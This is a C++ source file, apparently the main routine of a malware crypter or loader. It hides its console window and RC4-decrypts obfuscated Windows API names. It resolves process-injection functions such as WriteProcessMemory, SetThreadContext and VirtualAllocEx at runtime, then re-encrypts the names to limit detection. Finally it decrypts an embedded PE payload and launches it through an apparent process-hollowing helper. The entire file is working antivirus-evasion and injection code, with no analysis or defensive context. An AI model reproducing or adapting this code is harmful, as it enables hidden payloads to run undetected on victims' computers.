#pragma once
#include "funcs.hpp"
#include <iostream>
int main()
{
	AllocConsole();
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
	_rc4::_run_direct(&_imp_key, &_imp_krn32, 12, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_wpm, 18, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_tp, 16, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_cpw, 14, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_gtc, 16, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_stc, 16, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_va, 12, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_vaex, 14, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_vp, 14, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_vpex, 16, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_vf, 11, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_vfex, 13, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_gcp, 17, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_ch, 11, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_ct, 12, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_crt, 18, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_rt, 12, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_wfso, 19, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_gle, 12, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_gecp, 18, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_dap, 18, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_daps, 22, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_gmfnw, 18, 12);
	//get a handle to kernel32 and advapi32
	_api::_h_krn32 = LoadLibraryA(reinterpret_cast<char*>(_imp_krn32));
	if (_api::_h_krn32 == INVALID_HANDLE_VALUE) {
		return -11;
	}
	_api::_h_advapi32 = LoadLibraryA(reinterpret_cast<char*>(_imp_advapi32));
	if (_api::_h_advapi32 == INVALID_HANDLE_VALUE) {
		return -33;
	}
	//import kern32 funcs
	_api::__WriteProcessMemory = reinterpret_cast<_WriteProcessMemory>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_wpm)));
	_api::__TerminateProcess = reinterpret_cast<_TerminateProcess>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_tp)));
	_api::__CreateProcessW = reinterpret_cast<_CreateProcessW>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_cpw)));
	_api::__GetThreadContext = reinterpret_cast<_GetThreadContext>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_gtc)));
	_api::__SetThreadContext = reinterpret_cast<_SetThreadContext>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_stc)));
	_api::__VirtualProtect = reinterpret_cast<_VirtualProtect>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_vp)));
	_api::__VirtualAlloc = reinterpret_cast<_VirtualAlloc>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_va)));
	_api::__VirtualAllocEx = reinterpret_cast<_VirtualAllocEx>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_vaex)));
	_api::__VirtualProtectEx = reinterpret_cast<_VirtualProtectEx>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_vpex)));
	_api::__VirtualFree = reinterpret_cast<_VirtualFree>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_vf)));
	_api::__VirtualFreeEx = reinterpret_cast<_VirtualFreeEx>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_vfex)));
	_api::__GetModuleFileNameW = reinterpret_cast<_GetModuleFileNameW>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_gmfnw)));
	_api::__GetCurrentProcess = reinterpret_cast<_GetCurrentProcess>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_gcp)));
	_api::__CloseHandle = reinterpret_cast<_CloseHandle>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_ch)));
	_api::__CreateThread = reinterpret_cast<_CreateThread>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_ct)));
	_api::__ResumeThread = reinterpret_cast<_ResumeThread>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_rt)));
	_api::__WaitForSingleObject = reinterpret_cast<_WaitForSingleObject>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_wfso)));
	_api::__GetLastError = reinterpret_cast<_GetLastError>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_gle)));
	_api::__GetExitCodeProcess = reinterpret_cast<_GetExitCodeProcess>(GetProcAddress(_api::_h_krn32, reinterpret_cast<char*>(_imp_krn32_gecp)));
	//re-encrypt our arrays to limit detection vectors
	_rc4::_run_direct(&_imp_key, &_imp_krn32, 12, 12);
	_rc4::_run_direct(&_imp_key, &_imp_advapi32, 12, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_wpm, 18, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_tp, 16, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_cpw, 14, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_gtc, 16, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_stc, 16, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_va, 12, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_vaex, 14, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_vp, 14, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_vpex, 16, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_vf, 11, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_vfex, 13, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_gcp, 17, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_ch, 11, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_ct, 12, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_crt, 18, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_rt, 12, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_wfso, 19, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_gle, 12, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_gecp, 18, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_dap, 18, 12);
	_rc4::_run_direct(&_imp_key, &_imp_krn32_daps, 22, 12);
	DWORD _ret = 0;
	PROCESS_INFORMATION _pi;
	STARTUPINFOW _si;
	ZeroMemory(&_pi, sizeof(_pi));
	ZeroMemory(&_si, sizeof(_si));
	WCHAR _argsz[] = L"";
	//ACTUAL LENGTH IS -1 DISINCLUDE NULL PADDING
	const char* key = "fuckyoums";
	std::vector<unsigned char> _kptr(key, key + strlen(key));
	unsigned char* _dat = new unsigned char[184320];
	for (int i = 0; i < 184320; i++) {
		_dat[i] = _dummy_pe[i];
	}
	_rc4::_run_direct(lvoid(key), _dat, 184320, 9);
	if (!_funcs::_shellcode_gen_pe_loc(&_pi, &_si, reinterpret_cast<LPVOID>(_dat), _argsz, sizeof _argsz)) {
		_api::__WaitForSingleObject(_pi.hProcess, INFINITE);
		_api::__GetExitCodeProcess(_pi.hProcess, &_ret);
		_api::__CloseHandle(_pi.hThread);
		_api::__CloseHandle(_pi.hProcess);
		return -9819;
	}
	int p1, p2, p3;
    getchar();
	return 0;
}